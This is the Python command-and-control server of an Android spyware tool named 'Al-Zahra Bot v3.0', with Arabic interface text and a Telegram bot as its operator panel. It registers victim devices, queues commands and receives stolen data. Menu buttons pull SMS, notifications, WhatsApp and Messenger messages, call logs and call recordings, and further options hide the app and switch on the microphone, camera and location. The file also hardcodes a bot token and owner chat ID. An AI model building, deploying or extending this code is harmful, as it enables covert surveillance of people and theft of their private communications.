#!/usr/bin/env python3
"""
Al-Zahra Bot v3.0 - Server Side
يعمل على السيرفر بشكل مستقل
"""

import asyncio
import json
import logging
import os
import time
from datetime import datetime
from aiohttp import web

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('AlZahraBot')

# ═══════════════════════════════════════════
# الإعدادات
# ═══════════════════════════════════════════
BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443

# ═══════════════════════════════════════════
# تخزين البيانات
# ═══════════════════════════════════════════
class DataStore:
    def __init__(self):
        self.devices = {}  # {chat_id: device_info}
        self.pending_commands = {}  # {device_id: [commands]}
        self.received_data = {}  # {device_id: [data_files]}
        self.last_update_id = 0

data_store = DataStore()

# ═══════════════════════════════════════════
# وظائف مساعدة
# ═══════════════════════════════════════════
async def send_request(method, params=None):
    """إرسال طلب لـ Telegram API"""
    import aiohttp
    
    url = f"{API_BASE}/{method}"
    
    try:
        async with aiohttp.ClientSession() as session:
            if params:
                async with session.post(url, data=params) as resp:
                    return await resp.json()
            else:
                async with session.get(url) as resp:
                    return await resp.json()
    except Exception as e:
        logger.error(f"API error: {e}")
        return None

async def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    """إرسال رسالة"""
    params = {
        "chat_id": str(chat_id),
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    
    return await send_request("sendMessage", params)

async def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode="Markdown"):
    """تعديل رسالة"""
    params = {
        "chat_id": str(chat_id),
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        params["reply_markup"] = json.dumps(reply_markup)
    
    return await send_request("editMessageText", params)

async def answer_callback(callback_query_id, text=None):
    """الرد على callback"""
    params = {"callback_query_id": callback_query_id}
    if text:
        params["text"] = text
        params["show_alert"] = True
    
    return await send_request("answerCallbackQuery", params)

async def send_document(chat_id, file_path, caption=""):
    """إرسال ملف"""
    import aiohttp
    
    url = f"{API_BASE}/sendDocument"
    
    try:
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("parse_mode", "Markdown")
            data.add_field("document", open(file_path, "rb"))
            
            async with session.post(url, data=data) as resp:
                return await resp.json()
    except Exception as e:
        logger.error(f"Send document error: {e}")
        return None

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ═══════════════════════════════════════════
# لوحات التحكم
# ═══════════════════════════════════════════
def get_main_menu():
    """القائمة الرئيسية"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📱 الأجهزة المتصلة", "callback_data": "devices_list"}],
            [{"text": "⚙️ الإعدادات", "callback_data": "settings_main"}],
            [{"text": "📊 حالة النظام", "callback_data": "system_status"}]
        ]
    }
    return keyboard

def get_devices_menu():
    """قائمة الأجهزة"""
    devices = data_store.devices
    
    if not devices:
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 تحديث", "callback_data": "devices_list"}],
                [{"text": "🔙 رجوع", "callback_data": "back_main"}]
            ]
        }
        return keyboard
    
    buttons = []
    for device_id, info in devices.items():
        model = info.get("model", "غير معروف")
        status = "🟢" if info.get("online", False) else "🔴"
        buttons.append([{"text": f"{status} {model}", "callback_data": f"device_{device_id}"}])
    
    buttons.append([{"text": "🔄 تحديث", "callback_data": "devices_list"}])
    buttons.append([{"text": "🔙 رجوع", "callback_data": "back_main"}])
    
    return {"inline_keyboard": buttons}

def get_device_menu(device_id):
    """قائمة الجهاز"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📨 سحب SMS", "callback_data": f"cmd_{device_id}_sms"}],
            [{"text": "🔔 سحب الإشعارات", "callback_data": f"cmd_{device_id}_notifications"}],
            [{"text": "💬 سحب واتساب", "callback_data": f"cmd_{device_id}_whatsapp"}],
            [{"text": "📩 سحب ماسنجر", "callback_data": f"cmd_{device_id}_messenger"}],
            [{"text": "📞 سجل المكالمات", "callback_data": f"cmd_{device_id}_calls"}],
            [{"text": "ℹ️ معلومات الجهاز", "callback_data": f"cmd_{device_id}_info"}],
            [{"text": "🎙️ المكالمات المسجلة", "callback_data": f"cmd_{device_id}_recordings"}],
            [{"text": "🔙 رجوع", "callback_data": "devices_list"}]
        ]
    }
    return keyboard

def get_settings_menu():
    """قائمة الإعدادات"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔐 التحكم بالصلاحيات", "callback_data": "settings_permissions"}],
            [{"text": "🔒 إخفاء التطبيق", "callback_data": "settings_hide"}, {"text": "🔓 إظهار التطبيق", "callback_data": "settings_unhide"}],
            [{"text": "🎙️ تفعيل التسجيل", "callback_data": "settings_record_on"}, {"text": "⏹️ إيقاف التسجيل", "callback_data": "settings_record_off"}],
            [{"text": "🔙 رجوع", "callback_data": "back_main"}]
        ]
    }
    return keyboard

# ═══════════════════════════════════════════
# معالجة الأوامر
# ═══════════════════════════════════════════
async def handle_message(message):
    """معالجة الرسائل الواردة"""
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "")
    
    # التحقق من المالك
    if str(chat_id) != OWNER_CHAT_ID:
        await send_message(chat_id, "⛔ غير مصرح لك باستخدام هذا البوت")
        return
    
    # معالجة الأوامر
    if text == "/start" or text == "/help":
        await send_message(
            chat_id,
            f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}",
            reply_markup=get_main_menu()
        )
    elif text.startswith("/"):
        # أوامر مباشرة
        await handle_direct_command(chat_id, text)
    else:
        await send_message(chat_id, "❓ أمر غير معروف. استخدم /start")

async def handle_direct_command(chat_id, command):
    """معالجة الأوامر المباشرة"""
    parts = command.split()
    cmd = parts[0].lower()
    
    if cmd == "/devices":
        await show_devices(chat_id)
    elif cmd == "/settings":
        await send_message(chat_id, "⚙️ *الإعدادات*", reply_markup=get_settings_menu())
    elif cmd == "/status":
        await show_system_status(chat_id)
    else:
        await send_message(chat_id, f"❓ أمر غير معروف: {command}")

async def handle_callback(callback_query):
    """معالجة الأزرار"""
    chat_id = callback_query.get("message", {}).get("chat", {}).get("id")
    message_id = callback_query.get("message", {}).get("message_id")
    data = callback_query.get("data", "")
    query_id = callback_query.get("id")
    
    # التحقق من المالك
    if str(chat_id) != OWNER_CHAT_ID:
        await answer_callback(query_id, "⛔ غير مصرح")
        return
    
    logger.info(f"Callback: {data}")
    
    # ═══════════════════════════════════════════
    # التنقل الرئيسي
    # ═══════════════════════════════════════════
    if data == "back_main":
        await edit_message(
            chat_id, message_id,
            f"🎛️ *لوحة تحكم Al-Zahra*\n\n⏰ {get_timestamp()}",
            reply_markup=get_main_menu()
        )
    
    elif data == "devices_list":
        await show_devices(chat_id, message_id)
    
    elif data == "settings_main":
        await edit_message(
            chat_id, message_id,
            "⚙️ *الإعدادات*",
            reply_markup=get_settings_menu()
        )
    
    elif data == "system_status":
        await show_system_status(chat_id, message_id)
    
    # ═══════════════════════════════════════════
    # الأجهزة
    # ═══════════════════════════════════════════
    elif data.startswith("device_"):
        device_id = data.replace("device_", "")
        if device_id in data_store.devices:
            device = data_store.devices[device_id]
            text = f"📱 *{device.get('model', 'غير معروف')}*\n\n"
            text += f"🤖 Android {device.get('android', 'N/A')}\n"
            text += f"الحالة: {'🟢 متصل' if device.get('online') else '🔴 غير متصل'}\n"
            text += f"آخر اتصال: {device.get('last_seen', 'N/A')}"
            
            await edit_message(
                chat_id, message_id, text,
                reply_markup=get_device_menu(device_id)
            )
        else:
            await answer_callback(query_id, "❌ الجهاز غير متصل")
    
    # ═══════════════════════════════════════════
    # أوامر الجهاز
    # ═══════════════════════════════════════════
    elif data.startswith("cmd_"):
        parts = data.split("_", 2)
        if len(parts) >= 3:
            device_id = parts[1]
            action = parts[2]
            
            if device_id in data_store.devices:
                await answer_callback(query_id, f"⏳ جاري إرسال الأمر...")
                await send_message(chat_id, f"⏳ جاري معالجة الطلب...")
                
                # إضافة الأمر للقائمة المعلقة
                if device_id not in data_store.pending_commands:
                    data_store.pending_commands[device_id] = []
                data_store.pending_commands[device_id].append(action)
                
                await send_message(chat_id, f"✅ تم إرسال الأمر: {action}")
            else:
                await answer_callback(query_id, "❌ الجهاز غير متصل")
    
    # ═══════════════════════════════════════════
    # الإعدادات
    # ═══════════════════════════════════════════
    elif data == "settings_permissions":
        await edit_message(
            chat_id, message_id,
            "🔐 *التحكم بالصلاحيات*",
            reply_markup=get_permissions_menu()
        )
    
    elif data == "settings_hide":
        await answer_callback(query_id, "⏳ جاري إرسال أمر الإخفاء...")
        await send_message(chat_id, "🔒 تم إرسال أمر إخفاء التطبيق")
    
    elif data == "settings_unhide":
        await answer_callback(query_id, "⏳ جاري إرسال أمر الإظهار...")
        await send_message(chat_id, "🔓 تم إرسال أمر إظهار التطبيق")
    
    elif data == "settings_record_on":
        await answer_callback(query_id, "✅ تم تفعيل التسجيل")
        await send_message(chat_id, "🎙️ تم تفعيل تسجيل المكالمات")
    
    elif data == "settings_record_off":
        await answer_callback(query_id, "⏹️ تم إيقاف التسجيل")
        await send_message(chat_id, "⏹️ تم إيقاف تسجيل المكالمات")
    
    else:
        await answer_callback(query_id, f"❓ أمر غير معروف")

def get_permissions_menu():
    """قائمة الصلاحيات"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📨 تفعيل SMS", "callback_data": "perm_sms_on"}, {"text": "📨 تعطيل SMS", "callback_data": "perm_sms_off"}],
            [{"text": "📞 تفعيل المكالمات", "callback_data": "perm_calls_on"}, {"text": "📞 تعطيل المكالمات", "callback_data": "perm_calls_off"}],
            [{"text": "📍 تفعيل الموقع", "callback_data": "perm_location_on"}, {"text": "📍 تعطيل الموقع", "callback_data": "perm_location_off"}],
            [{"text": "📷 تفعيل الكاميرا", "callback_data": "perm_camera_on"}, {"text": "📷 تعطيل الكاميرا", "callback_data": "perm_camera_off"}],
            [{"text": "🎙️ تفعيل الميكروفون", "callback_data": "perm_mic_on"}, {"text": "🎙️ تعطيل الميكروفون", "callback_data": "perm_mic_off"}],
            [{"text": "🔙 رجوع", "callback_data": "settings_main"}]
        ]
    }
    return keyboard

async def show_devices(chat_id, message_id=None):
    """عرض الأجهزة"""
    devices = data_store.devices
    
    if not devices:
        text = "📱 *الأجهزة المتصلة*\n\n❌ لا توجد أجهزة متصلة حالياً"
    else:
        text = "📱 *الأجهزة المتصلة*\n\n"
        for device_id, info in devices.items():
            status = "🟢" if info.get("online", False) else "🔴"
            text += f"{status} {info.get('model', 'غير معروف')}\n"
    
    if message_id:
        await edit_message(chat_id, message_id, text, reply_markup=get_devices_menu())
    else:
        await send_message(chat_id, text, reply_markup=get_devices_menu())

async def show_system_status(chat_id, message_id=None):
    """عرض حالة النظام"""
    import psutil
    
    cpu = psutil.cpu_percent()
    memory = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    
    text = f"📊 *حالة النظام*\n\n"
    text += f"💻 CPU: {cpu}%\n"
    text += f"🧠 RAM: {memory}%\n"
    text += f"💾 Disk: {disk}%\n"
    text += f"📱 أجهزة متصلة: {len(data_store.devices)}\n"
    text += f"⏰ {get_timestamp()}"
    
    keyboard = {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_main"}]]}
    
    if message_id:
        await edit_message(chat_id, message_id, text, reply_markup=keyboard)
    else:
        await send_message(chat_id, text, reply_markup=keyboard)

# ═══════════════════════════════════════════
# استقبال التحديثات
# ═══════════════════════════════════════════
async def get_updates():
    """استقبال التحديثات من Telegram"""
    global data_store
    
    while True:
        try:
            params = {
                "offset": data_store.last_update_id + 1,
                "limit": 10,
                "timeout": 30
            }
            
            result = await send_request("getUpdates", params)
            
            if result and result.get("ok"):
                for update in result.get("result", []):
                    update_id = update.get("update_id", 0)
                    data_store.last_update_id = update_id
                    
                    if "message" in update:
                        await handle_message(update["message"])
                    elif "callback_query" in update:
                        await handle_callback(update["callback_query"])
            
            await asyncio.sleep(1)
            
        except Exception as e:
            logger.error(f"Update error: {e}")
            await asyncio.sleep(5)

# ═══════════════════════════════════════════
# خادم الويب (للتواصل مع التطبيق)
# ═══════════════════════════════════════════
async def handle_device_register(request):
    """تسجيل جهاز جديد"""
    try:
        data = await request.json()
        device_id = data.get("device_id")
        model = data.get("model", "Unknown")
        android = data.get("android", "Unknown")
        
        data_store.devices[device_id] = {
            "model": model,
            "android": android,
            "online": True,
            "last_seen": get_timestamp(),
            "registered": get_timestamp()
        }
        
        logger.info(f"Device registered: {device_id} ({model})")
        
        # إشعار المالك
        await send_message(
            OWNER_CHAT_ID,
            f"🟢 جهاز جديد متصل!\n📱 {model}\n🤖 Android {android}"
        )
        
        return web.json_response({"status": "ok"})
        
    except Exception as e:
        logger.error(f"Register error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def handle_device_data(request):
    """استقبال بيانات من الجهاز"""
    try:
        data = await request.json()
        device_id = data.get("device_id")
        data_type = data.get("type")
        content = data.get("content")
        
        # حفظ البيانات
        if device_id not in data_store.received_data:
            data_store.received_data[device_id] = []
        
        data_store.received_data[device_id].append({
            "type": data_type,
            "content": content,
            "time": get_timestamp()
        })
        
        logger.info(f"Data received from {device_id}: {data_type}")
        
        return web.json_response({"status": "ok"})
        
    except Exception as e:
        logger.error(f"Data error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def handle_get_commands(request):
    """جلب الأوامر المعلقة للجهاز"""
    try:
        device_id = request.query.get("device_id", "")
        
        commands = data_store.pending_commands.get(device_id, [])
        data_store.pending_commands[device_id] = []
        
        return web.json_response({"commands": commands})
        
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        return web.json_response({"commands": []})

async def init_web_app():
    """تهيئة خادم الويب"""
    app = web.Application()
    app.router.add_post("/api/register", handle_device_register)
    app.router.add_post("/api/data", handle_device_data)
    app.router.add_get("/api/commands", handle_get_commands)
    
    return app

# ═══════════════════════════════════════════
# التشغيل الرئيسي
# ═══════════════════════════════════════════
async def main():
    """الدالة الرئيسية"""
    logger.info("=" * 50)
    logger.info("  Al-Zahra Bot v3.0 Starting...")
    logger.info("=" * 50)
    
    # تشغيل خادم الويب
    web_app = await init_web_app()
    runner = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    logger.info(f"Web server started on port {PORT}")
    
    # تشغيل استقبال التحديثات
    await get_updates()

if __name__ == "__main__":
    asyncio.run(main())
